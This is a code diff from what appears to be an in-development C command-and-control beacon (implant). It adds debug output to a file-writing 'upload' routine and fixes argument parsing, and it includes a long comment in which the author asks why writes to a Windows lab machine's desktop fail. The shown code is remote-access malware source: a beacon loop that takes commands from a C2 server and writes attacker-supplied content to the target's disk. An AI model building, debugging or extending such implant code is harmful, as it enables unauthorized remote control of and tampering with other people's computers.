@@ -188,15 +188,18 @@ DWORD getpid(){
 #define B64_FILE_ERROR          2
 
 int upload(char * filename, char * content){
+	printf("[upload] [DBG] Filename as from within upload function: %s", filename);
 	// Upload contents to a file
 	int retcode = B64_FILE_ERROR;
+	errno = 0;
 	FILE *outfile;
 	outfile = fopen(filename, "wb");
 	if (!outfile) {
-		printf("[upload] [DBG] Error opening file...\n");
+		printf("[upload] [DBG] Error opening file... Errno %d\n", errno);
 		return retcode;
 	}
 	else {
+		printf("[upload] [DBG] File handle got. Uploading...\n");
 		fwrite(content,strlen(content),1,outfile);
 		fclose(outfile);
 		return 0;
@@ -337,14 +340,54 @@ void StartBeacon(char* C2Server, int C2Port)
 			char * command;
 			char delim[] = " ";
 			command = strtok(RecvData, delim);
-			printf("[beacon] [DBG] Command is %s: ", command);
+			printf("[beacon] [DBG] Command is: %s", command);
 
 
 			// Command parsed as whoami (strpcmp makes comparsion with predefined string in this case)
 			if (strcmp(command, "\n") == 0) { memset(RecvData, 0, sizeof(RecvData)); }
 			else if (strcmp(command, "upload") == 0) {
-				char * file = strtok(RecvData, delim);
+				// Getting argument after upload into 'file' pointer
+				char * file = strtok(NULL, delim);
 				//char * file = "C:\\Users\\IEUser\\Desktop\\test";
+
+				/* All of scenarios failes....
+				WHY???
+
+				192.168.56.114 $ upload test
+				Failed to write file test
+
+				192.168.56.114 $ upload "C:\\Users\\IEUser\\Desktop\\testing"
+				Failed to write file "C:\\Users\\IEUser\\Desktop\\testing"
+
+				192.168.56.114 $ upload C:\\Users\\IEUser\\Desktop\\testing
+				Failed to write file C:\\Users\\IEUser\\Desktop\\testing
+
+				192.168.56.114 $ upload C:\Users\IEUser\Desktop\testing
+				Failed to write file C:\Users\IEUser\Desktop\testing
+
+				FILENAME IS PARSED CORRECTLY:
+
+				[beacon] [DBG] Command is: upload 
+				[beacon] [DBG] Uploading t3st1ng into test
+				[upload] [DBG] Filename as from within upload function: test
+				[upload] [DBG] Error opening file...
+				
+				[beacon] [DBG] Command is: upload 
+				[beacon] [DBG] Uploading t3st1ng into "C:\\Users\\IEUser\\Desktop\\testing"
+				[upload] [DBG] Filename as from within upload function: "C:\\Users\\IEUser\\Desktop\\testing"
+				[upload] [DBG] Error opening file...
+				
+				[beacon] [DBG] Command is: upload 
+				[beacon] [DBG] Uploading t3st1ng into C:\\Users\\IEUser\\Desktop\\testing
+				[upload] [DBG] Filename as from within upload function: C:\\Users\\IEUser\\Desktop\\testing
+				[upload] [DBG] Error opening file...
+
+				[beacon] [DBG] Command is: upload 
+				[beacon] [DBG] Uploading t3st1ng into C:\Users\IEUser\Desktop\testing
+				[upload] [DBG] Filename as from within upload function: C:\Users\IEUser\Desktop\testing
+				[upload] [DBG] Error opening file...
+				 */
+				
 				char * contents = "t3st1ng";
 				printf(" [beacon] [DBG] Uploading %s into %s",contents,file);
 				int result;
